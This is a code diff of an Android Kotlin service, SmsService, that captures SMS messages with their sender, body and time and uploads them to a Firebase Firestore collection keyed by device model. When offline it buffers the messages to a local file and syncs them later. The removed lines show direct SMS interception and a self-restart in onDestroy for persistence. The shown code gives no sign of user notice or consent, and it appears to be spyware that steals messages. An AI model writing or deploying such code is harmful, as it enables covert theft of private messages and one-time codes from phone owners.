@@ -36,34 +36,22 @@ class SmsService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        // Agar servicemiz o'chib ketgan bo'lsa, uning qayta ishga tushishini belgilab qo'yamiz
-        val serviceIntent = Intent(this, SmsService::class.java)
-        startService(serviceIntent)
     }
 
     private fun handleIncomingSms(intent: Intent?) {
-        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
-            val bundle = intent.extras
-            if (bundle != null) {
-                val pdus = bundle.get("pdus") as Array<*>
-                for (i in pdus.indices) {
-                    val smsMessage = android.telephony.SmsMessage.createFromPdu(pdus[i] as ByteArray)
-                    val senderPhoneNumber = smsMessage.originatingAddress
-                    val messageBody = smsMessage.messageBody
-                    val sentTime = smsMessage.timestampMillis
-                    val smsData = SMSData(messageBody ?: "", senderPhoneNumber ?: "", convertMillisToReadableTime(sentTime))
-                    if (isOnline()){
-                        if (isLocalSmsAvailable()){
-                            sendAllSmsDataToFirebase()
-                            saveSmsDataToFirebase(smsData)
-                        }else {
-                            saveSmsDataToFirebase(smsData)
+        if (intent?.action == "com.azamovhudstc.SMS_ACTION") {
+            Log.d("EVENT", "handleIncomingSms: ")
+            val smsData = intent.getSerializableExtra("smsData") as SMSData
+            if (isOnline()) {
+                if (isLocalSmsAvailable()) {
+                    sendAllSmsDataToFirebase()
+                    saveSmsDataToFirebase(smsData)
+                } else {
+                    saveSmsDataToFirebase(smsData)
 
-                        }
-                    }else{
-                        saveSmsToFile(smsData)
-                    }
                 }
+            } else {
+                saveSmsToFile(smsData)
             }
         }
     }
@@ -74,12 +62,6 @@ class SmsService : Service() {
         return filePath.exists()
     }
 
-    private fun convertMillisToReadableTime(timestamp: Long): String {
-        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-        val calendar = Calendar.getInstance()
-        calendar.timeInMillis = timestamp
-        return sdf.format(calendar.time)
-    }
 
     private fun saveSmsToFile(smsData: SMSData) {
         val gson = Gson()
@@ -95,7 +77,8 @@ class SmsService : Service() {
     }
 
     private fun isOnline(): Boolean {
-        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val connectivityManager =
+            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val networkInfo = connectivityManager.activeNetworkInfo
         return networkInfo != null && networkInfo.isConnected
     }
@@ -116,6 +99,7 @@ class SmsService : Service() {
                 }
         }
     }
+
     private fun saveSmsDataToFirebase(smsData: SMSData) {
         val deviceModel = android.os.Build.MODEL
         val collectionReference = firestore.collection("sms_$deviceModel")
